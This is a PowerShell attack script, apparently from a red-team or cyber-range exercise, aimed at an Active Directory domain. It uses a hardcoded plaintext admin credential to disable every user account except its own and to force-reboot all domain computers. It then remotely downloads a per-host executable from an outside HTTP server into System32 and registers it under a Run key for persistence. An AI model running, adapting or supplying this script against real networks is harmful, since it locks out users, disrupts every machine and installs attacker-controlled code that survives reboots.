$pass = ConvertTo-SecureString "Sn3akyP@55" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("DCO\BADMIN", $pass)

$hostnames = @()
$users = @()

Get-ADComputer -Filter * | Where-Object { $_.Name -ne "CI-SERVICE-WIN2" } | ForEach-Object { $hostnames += $_.Name }
Get-ADUser -Filter * -Properties Name | Select-Object -ExpandProperty Name | Where-Object { $_ -ne "BADMIN" } | ForEach-Object { $users += $_ }

Write-Host "Printing Names for Stager Creations..."
Write-Host " "
$hostnames | ForEach-Object { Write-Host $_ }
Write-Host " "
Write-Host " "
Write-Host "Press 'Enter' To Perform Starting Attack"
Read-Host

Write-Host "Performing Attack...."

Write-Host "Disabling All Acounts But BADMIN..."
$maxUsers = $users.Count
$currNumber = 0
$users | ForEach-Object {
	$currNumber = $currNumber + 1
	$perTillDone = ($currNumber / $maxUsers) * 100
	Write-Progress -Activity "Disabling Accounts" -Status "$perTillDone% / 100%" -PercentComplete $perTillDone
	Disable-ADAccount -Credential $cred -Identity $_ 
}

Write-Host "Sending Reboot to Hosts..."
$maxHosts = $hostnames.Count
$currHostNumber = 0
$hostnames | ForEach-Object {
	$currHostNumber = $currHostNumber + 1
	$perTillDone = ($currHostNumber / $maxHosts) * 100
	Write-Progress -Activity "Rebooting Windows" -Status "$perTillDone% / 100%" -PercentComplete $perTillDone 
	Invoke-Command -Credential $cred -ComputerName $_ -ScriptBlock { Restart-Computer -Force } 
}

Write-Host "Hosts Rebooted, Press 'Enter' To Execute Attack"
Read-Host


Write-Host "Sending Registery Key Command..."
$hostnames | ForEach-Object { Invoke-Command -Credential $cred -ComputerName $_ -ScriptBlock {
	$url = "http://72.0.0.11:8000/"
	$hostname = $env:computername
	$outFile = "C:\Windows\System32\" + $hostname + ".exe"
	
	Invoke-WebRequest -Uri "$($url+$hostname).exe" -UseBasicParsing -OutFile $outFile
	$registeryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
	$registeryValue = "cmd.exe /c $($outFile)"
	Set-ItemProperty -Path $registeryPath -Name "critical" -Value $registeryValue
}}

Write-Host "Attack Complete"
